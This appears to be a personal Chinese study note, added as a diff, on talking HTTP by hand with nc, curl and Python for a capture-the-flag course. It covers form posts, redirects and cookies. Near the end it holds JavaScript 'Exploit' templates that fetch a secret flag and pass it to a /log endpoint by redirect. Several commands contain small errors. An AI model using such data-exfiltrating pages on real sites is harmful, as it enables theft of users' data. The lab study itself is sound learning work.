@@ -1,0 +1,162 @@
+目前所需要做的都是基于HTTP 1.1 使用
+    -nc 可以建立原始通道与服务器进行通讯，模拟与HTTP和SMTP服务器进行通讯
+        -nc -v challenge.localhost 80 -v 表示详细模式
+            查询服务器的状态，并且允许输入相关命令
+            --GET / HTTP/1.1  分别位 请求的资源，请求的方式，HTTP的版本
+            --Host: challenge.localhost  表示请求的主机
+            --Accept: */*  表示接受的数据类型
+            --User-Agent: curl/7.47.0  表示客户端的类型 
+                有的时候不要求User-Agent则可以忽略
+   
+
+     -curl 新的方式可以与nc完成类似的功能
+        --curl -v -H "Host: challenge.localhost" challenge.localhost
+            -v 表示详细模式
+            -H 表示请求头
+            challenge.localhost 表示请求的主机
+   
+
+ --表单填写
+ 
+    --使用nc填写表单
+            --POST / HTTP/1.1  表示请求的资源，请求的方式，HTTP的版本 
+            --Host: challenge.localhost  表示请求的主机
+            --Accept: */*  表示接受的数据类型
+            --Content-Type: application/x-www-form-urlencoded
+            --Content-Length: 19 表示数据的长度
+
+            secret_key=ilzcrbpx 表示提交的数据
+    --curl表单填写
+        --curl -d "challenge_key=foamyttt" -H "Host: challenge.localhost" http://challenge.localhost/attempt
+            -d 表示提交的数据
+            -H 表示请求头
+            http://challenge.localhost/attempt 表示请求的资源
+    --python表单填写
+        import requests
+        url ="http://challenge.localhost/attempt"
+        data={"challenge_key":"foamyttt"}
+        headers={"Host":"challenge.localhost"}
+        response=request.post(url,data=data,headers=headers)
+        print(response.text)
+    --重新导向
+        --nc 
+            --nc -v chalenge.localhost 80
+            --GET / HTTP/1.1
+            --Host: challenge.localhost
+            --Accept: */*
+            --此时会返回一个302状态码，表示重定向，并且给出新的地址
+        之后重新启动nc
+            --nc -v challenge.localhost 80
+            --GET /location HTTP/1.1
+            --Host: challenge.localhost
+            --Accept: */*
+            --此时会返回一个200状态码，表示成功
+        --curl 
+            --curl -H "Host: challenge.localhost" http://challenge.localhost
+            --此时会返回一个302状态码，表示重定向，并且给出新的地址
+        之后重新启动curl
+            --curl -H -L "Host: challenge.localhost" http://challenge.localhost
+                --L 可以自动根据重定向的地址进行访问
+    --cookie    
+        --curl
+            --curl -v -H "Host: challenge.localhost" http://127.0.0.1/80
+                --使用此方法会返回一个cookie，然后再次使用此cookie进行访问
+            --curl -v -H "Host: challenge.localhost" -b "cookie=e5d667ccb42457027be31f615fd9e034" http://127.0.0.1/80
+                --b 使用此方法可以直接访问cookie 
+        --nc
+            --nc -v 127.0.0.1 80
+                --GET / HTTP/1.1
+                --Host: challenge.localhost
+                --Accept: */*
+                --此时会返回一个cookie，然后再次使用此cookie进行访问
+            --nc -v 127.0.0.1 80
+                --GET / HTTP/1.1
+                --Host: challenge.localhost
+                --Accept: */*
+                --Cookie: e5d667ccb42457027be31f615fd9e034
+                --此时可以直接访问cookie
+        --python
+            import requests
+            url="http://127.0.0.1 80"
+            headers={"Host":"challenge.localhost"}
+            response=requests.get(url,headers=headers)
+            print(response.cookies)
+
+    --多项表单填写
+        --nc 
+            --nc -v challenge.localhost 80
+            POST /check HTTP/1.1
+            Host: challenge.localhost
+            Accept: */*
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 75
+
+            credential=ektpsesz&access_code=qmtjzdzq&login_key=piremche&access=vmvfqlqp
+        --curl
+            --curl -d "credential=ektpsesz&access_code=qmtjzdzq&login_key=piremche&access=vmvfqlqp" -H "Host: challenge.localhost" http://challenge.localhost/check
+
+        --其中的Content-Length可以使用python的len()去快速查看
+            --len("credential=ektpsesz&access_code=qmtjzdzq&login_key=piremche&access=vmvfqlqp")
+        --其中的Content-Type为多种固定格式，可以根据实际情况进行更改
+
+
+
+
+javaScripe
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+    <script src="http://challenge.localhost:80/check"></script>
+    <script>
+     
+            window.location = "http://challenge.localhost:80/log?flag="+ flag;
+      
+    </script>
+</head>
+<body>
+    <h1>Exploit Running...</h1>
+</body>
+</html>
+    --这个位标准格式，所需要更改改的只有script部分
+        --src="http://challenge.localhost:80/check"  表示引入一个js文件,并且执行。这个会启用server端的check函数，其会返回一个flag
+        --window.location = "http://challenge.localhost:80/log?flag="+ flag，表示跳转到指定的地址，并且传递参数
+        --由于此时并没有太多要求，所以可以直接使用这个js文件进行跳转，否则需要添加相应的时间，让js文件执行
+
+
+--GET flag
+        let url = "http://challenge.localhost:80/qualify?secret=iaslacqu&access=zogiuepj&secret_key=szpgxasl";
+
+        fetch(url, {
+            method: "GET",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" }
+        })
+        .then(response => response.text())
+        .then(flag => {
+            // 将 flag 发送到日志记录页面
+            window.location = "http://challenge.localhost:80/log?flag=" + encodeURIComponent(flag);
+        })
+
+--POST flag
+fetch("http://challenge.localhost:80/attempt", {
+    method: "POST",
+   headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: "keycode=sprdcgps&secure_key=nwommkbu&hash=blmxgbef"
+})
+.then(response => response.text())
+.then(flag => {
+    window.location = "http://challenge.localhost:80/log?flag=" + encodeURIComponent(flag);
+})
+.catch(error => console.error("Error fetching flag:", error));
+    --psot需要添加method，headers，body
+    --method: "POST" 表示请求的方式
+    --headers: { "Content-Type": "application/x-www-form-urlencoded" } 表示的格式，这个是固定的不同的需求有不同的格式
+    --body: "keycode=sprdcgps&secure_key=nwommkbu&hash=blmxgbef" 表示提交的数据
+
+
+
+
+
+
+
+
